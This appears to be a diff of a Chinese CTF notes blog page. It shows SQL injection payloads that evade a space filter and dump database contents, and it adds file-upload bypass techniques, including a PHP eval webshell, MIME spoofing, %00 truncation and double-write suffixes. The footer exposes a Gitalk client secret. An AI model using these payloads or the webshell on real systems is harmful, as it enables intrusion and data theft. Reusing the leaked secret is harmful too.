@@ -48,6 +48,10 @@
 <li><a href="#无验证">无验证</a></li>
 <li><a href="#前端验证">前端验证</a></li>
 <li><a href="#htaccess">.htaccess</a></li>
+<li><a href="#mime">MIME</a></li>
+<li><a href="#文件头检查">文件头检查</a></li>
+<li><a href="#00截断">00截断</a></li>
+<li><a href="#双写后缀">双写后缀</a></li>
 </ul>
 </li>
 </ul>
@@ -308,7 +312,10 @@
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 and 1 = 1 <span class="comment"># 发现被过滤了</span></span><br><span class="line">1<span class="comment">/**/</span>and<span class="comment">/**/</span>1<span class="comment">/**/</span>=<span class="comment">/**/</span>1 <span class="comment"># 发现正确，继续构造payload语句，发现等于2时回显错误，说明此题存在过滤空格注入</span></span><br><span class="line">1<span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span>2 <span class="comment"># 查看有几位</span></span><br><span class="line">1<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment"># 发现无回显，需要加负号操作</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> <span class="comment"># 成功发现回显</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">version</span>() <span class="comment"># 发现回显位</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata <span class="comment"># 查看所有数据库</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">'sqli'</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="string">'sqli'</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name=<span class="string">'lqsyncyuso'</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure>
 
-<h3><span id="文件上传">文件上传</span></h3><h4><span id="无验证">无验证</span></h4><ol>
+<h3><span id="文件上传">文件上传</span></h3><ul>
+<li>tips: MacBook上有个坑，上传隐藏文件时候需要配合命令<code>command+shift+.</code></li>
+</ul>
+<h4><span id="无验证">无验证</span></h4><ol>
 <li>通过Wappalyzer来查看当前页面的基础环境，如中间件，前后端语言等 </li>
 <li>将一句话木马上传到服务器</li>
 </ol>
@@ -362,6 +369,24 @@
 </ul>
 </li>
 </ol>
+<h4><span id="mime">MIME</span></h4><ul>
+<li>上传php文件，并将content-type改成image/png即可</li>
+</ul>
+<h4><span id="文件头检查">文件头检查</span></h4><p>原理：服务器会检查png的头格式</p>
+<ul>
+<li><p>截图上传文件，通过<code>burpsuite</code>进行代理</p>
+</li>
+<li><p>在图片后面添加一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>($_REQUEST[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>修改文件后缀.php</p>
+</li>
+<li><p>使用蚁剑连接</p>
+</li>
+</ul>
+<h4><span id="00截断">00截断</span></h4><p><strong>%00的使用是在路径上</strong></p>
+<p>就是在.php文件后加上%00后接.jpg，这里我们就可以绕过对php文件的过滤。在执行时，%00会把后面的.jpg截断，所以执行的时候他执行的仍然是前面的.php文件。就可以实现我们的马子文件的执行。</p>
+<h4><span id="双写后缀">双写后缀</span></h4><p>原理：服务器会替换后缀’php’-&gt;’’，因此我们只需要拼接后缀为”pphphp”即可</p>
 <h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1></div><div class="tags"><a href="/tags/ctf/"><i class="fa fa-tag"></i>ctf</a></div><div class="post-nav"><a class="next" href="/2022/12/23/Spring%20Security/">Spring Security</a></div><div id="container"></div><link rel="stylesheet" type="text/css" href="//unpkg.com/gitalk/dist/gitalk.css?v=0.0.0"><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=0.0.0"></script><script type="text/javascript" src="//unpkg.com/gitalk/dist/gitalk.min.js?v=0.0.0"></script><script>var gitalk = new Gitalk({
   clientID: 'd154fff64901622afbb6',
   clientSecret: '5b3f1d58c331b54703e4477e1f8fa1e42e9c1082',
